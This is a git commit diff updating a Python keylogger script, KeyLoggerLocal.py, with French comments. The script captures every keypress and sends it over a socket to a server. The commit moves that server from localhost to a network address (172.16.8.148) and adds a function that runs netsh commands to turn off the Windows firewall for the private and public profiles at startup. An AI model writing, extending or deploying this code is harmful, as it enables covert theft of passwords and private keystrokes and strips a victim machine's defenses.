3fdd4ba44d934a4b75fd8f6da02d4c66d7c91c67
InGabIGB <136855257+InGabIGB@users.noreply.github.com>
2025-03-04 11:25:06 +0100

    Update KeyLoggerLocal.py

--- KeyLoggerLocal.py
+++ KeyLoggerLocal.py
@@ -2,7 +2,7 @@ import keyboard
 import socket
 
 # Adresse et port du serveur local
-SERVER_IP = "127.0.0.1"
+SERVER_IP = "172.16.8.148"
 SERVER_PORT = 65432
 
 def send_keypress(key):
@@ -14,6 +14,15 @@ def send_keypress(key):
     except ConnectionRefusedError:
         pass  # Si le serveur n'est pas en ligne, on ignore l'erreur
 
+def disable_firewall():
+    try:
+        # Désactiver le pare-feu pour les réseaux Privé et Public
+        os.system("netsh advfirewall set privateprofile state off")
+        os.system("netsh advfirewall set publicprofile state off")
+        print("[INFO] Pare-feu désactivé pour les réseaux Privé et Public.")
+    except Exception as e:
+        print(f"[ERREUR] Impossible de désactiver le pare-feu : {e}")
+disable_firewall()
 # Écoute les touches en continu
 keyboard.on_press(send_keypress)
 keyboard.wait()
